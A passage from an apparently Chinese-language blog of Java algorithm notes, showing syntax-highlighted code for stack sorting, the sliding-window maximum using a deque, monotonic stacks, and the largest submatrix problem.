    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">reverse</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>helpStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>helpStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>方法2（利用栈本身，更省空间）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 通过一个栈来帮另一个栈做排序， 将多余的值直接放入stack，性能更好，也更节省空间</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reverseByStackPlus</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> helpStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Integer</span> cur <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>helpStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> helpStack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> cur<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>helpStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        helpStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>helpStack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>helpStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="生成窗口最大值数组-双端队列"><a href="#生成窗口最大值数组-双端队列" class="headerlink" title="生成窗口最大值数组(双端队列)"></a>生成窗口最大值数组(双端队列)</h2><p>输入：整形数组arr，窗口大小w。</p>
<p>输出：一个长度为n-w+1的数组res，res[i]表示每一种窗口状态下最大值</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 生窗口最大值数组，本题的关键在于利用双端队列，来记录滑动窗口的最大值
 * 为啥用双端队列？ 因为我们需要动态的从队列的头和尾更新值
 * @param arr 输入数组
 * @param w   窗口大小
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getMaxWindow</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> w <span class="token operator">||</span> w<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// arr.length - w + 1 表示窗口大小w时，最终能获取到多少个最大值</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> w <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// 双端队列，记录窗口内最大值，并进行数据的更新，</span>
    <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 插入策略</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>queue<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>queue<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 队列中记录的是最大值的下标，方便更新时，判断是否过期</span>
            queue<span class="token punctuation">.</span><span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        queue<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 弹出策略 i-w 表示过期值，比如i=5，w=3,i-w=2, 当前遍历到i=5的点，窗口长度为3，那当前窗口内有效值应该是&#123;3,4,5&#125;，2已经过期了</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>queue<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i<span class="token operator">-</span>w<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            queue<span class="token punctuation">.</span><span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> w <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">[</span>index<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>queue<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="单调栈结构"><a href="#单调栈结构" class="headerlink" title="单调栈结构"></a>单调栈结构</h2><blockquote>
<p>给定一个不含有重复值的数组arr，找到每个i位置左边和右边离i位置最近且值比arr[i]小的位置，返回所有位置的相应信息</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 单调栈结构-找到每个节点离自己最近且比自己小的节点位置
 * 这里默认arr内无重复值
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">rightWay</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// 栈内存储节点位置</span>
    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 策略：遍历数组，并将值放入栈中，</span>
    <span class="token comment">// 如果比栈顶值大，则直接放入，下面的值就是离自己最近的最小值点</span>
    <span class="token comment">// 如果比栈顶值小，则将栈中比自己大的都弹出，确认对应的坐标</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">Integer</span> popIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            res<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            res<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 最后如果栈中还有数据，则一定是升序，也就是说栈内的每个节点都是左边有比自己小的，右边没有。</span>
    <span class="token comment">// 这里需要注意栈底的点，这个点是左边也没有，右边也没有</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Integer</span> popIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        res<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        res<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 单调栈结构-找到每个节点离自己最近且比自己小的节点位置
 * 这里默认数组内有重复值
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">rightWay</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// 栈内存储节点位置，节点用List，来存储多个相同的值，List内部存储的也是坐标</span>
    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 策略：遍历数组，并将值放入栈中</span>
    <span class="token comment">// 如果比栈顶值大，则直接放入，下面的值就是离自己最近的最小值点</span>
    <span class="token comment">// 如果和栈顶值一样，则加入栈顶的元素集合中</span>
    <span class="token comment">// 如果比栈顶值小，则将栈中比自己大的都弹出，确认对应的坐标</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> popList <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> popi <span class="token operator">:</span> popList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                res<span class="token punctuation">[</span>popi<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>
                res<span class="token punctuation">[</span>popi<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> popList <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> popi <span class="token operator">:</span> popList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">[</span>popi<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>
            res<span class="token punctuation">[</span>popi<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="求最大子矩阵的大小（单调栈应用）"><a href="#求最大子矩阵的大小（单调栈应用）" class="headerlink" title="求最大子矩阵的大小（单调栈应用）"></a>求最大子矩阵的大小（单调栈应用）</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/**
 * 求最大子矩阵的大小 -》 单调栈
 * @param arr
 * @return
 */</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxRecSize</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 记录切分后每个位置的高度</span>
    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> record <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// 步骤1：将二维数组切割为一维数组，record[i] 表示i位置上有多高</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> curList <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> curList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            record<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> curList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 步骤2：利用单调栈找出每个点左右两侧，离自己最近且比自己小的</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> record<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> record<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> record<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 如果当前值小于栈顶元素，说明栈顶元素列的最大面积已经能计算出来了</span>
            <span class="token keyword">int</span> popIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> popLeftIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 面积值:(i-popLeftIndex-1)*record[popIndex]</span>
            max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>max<span class="token punctuation">,</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> popLeftIndex <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> record<span class="token punctuation">[</span>popIndex<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 栈内可能还有剩余元素</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span> popIndex <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
